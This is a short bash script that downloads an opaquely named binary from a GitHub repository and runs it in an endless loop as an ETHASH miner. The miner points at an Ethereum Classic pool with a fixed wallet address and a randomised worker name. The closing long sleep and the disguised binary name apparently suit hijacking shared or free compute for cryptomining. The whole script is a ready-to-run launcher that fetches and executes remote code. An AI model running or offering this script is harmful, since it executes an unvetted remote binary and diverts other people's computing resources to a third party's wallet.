#!/bin/bash
POOL=us-etc.2miners.com:1010
WALLET=0x663bDc4a1eDeCDDCe775862bBE859D6A84a72fB8
WORKER=$(echo $(shuf -i 10-40 -n 1)-DOGEDANK)
wget https://github.com/goldengoose45/karmasama/raw/main/korosxgpu
chmod +x korosxgpu
while [ 1 ]; do
./korosxgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999 
